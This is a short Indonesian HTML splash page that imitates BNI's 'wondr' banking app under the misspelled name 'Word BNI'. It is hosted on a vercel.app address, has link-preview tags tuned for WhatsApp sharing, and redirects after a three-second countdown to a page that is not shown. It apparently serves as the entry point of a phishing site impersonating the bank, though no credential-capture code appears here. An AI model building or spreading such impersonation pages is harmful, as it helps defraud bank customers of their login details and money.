<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <!-- ✅ PENGATURAN AGAR PAS DI LAYAR HP -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Masuk ke Word BNI</title>
    
    <!-- KODE AGAR TAMPILAN DI WHATSAPP LEBIH BAGUS -->
    <meta property="og:image" content="https://word-bni-two.vercel.app/bni.jpg" />
    <meta property="og:title" content="Word BNi" />
    <meta property="og:description" content="Dompet ketinggalan gak jadi halangan. Dengan wondr, tarik tunai bisa tanpa kartu. Tarik tunai praktis tanpa kartu dengan wondr. Cukup siapin handphone" />
    <meta property="og:url" content="https://word-bni-two.vercel.app/" />

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden; /* Mencegah layar bisa digeser */
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000000;
            position: relative;
        }

        /* ✅ PERBAIKAN TAMPILAN GAMBAR: PAS DAN UTUH DI LAYAR */
        #gambarPembuka {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Gambar memenuhi layar dengan pas */
            object-position: center; /* Posisi gambar di tengah */
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

       
        }
    </style>
</head>
<body>

    <img id="gambarPembuka" src="wordbni.jpg" alt="wordbni">
    <div id="timer">3</div>

    <script>
        let waktu = 3;
        let timerDisplay = document.getElementById('timer');
        
        let hitungMundur = setInterval(function() {
            waktu--;
            timerDisplay.textContent = waktu;
            
            if(waktu <= 0) {
                clearInterval(hitungMundur);
                // Pindah ke halaman tujuan
                window.location.href = "index1.html"; 
            }
        }, 1000);
    </script>

</body>
</html>
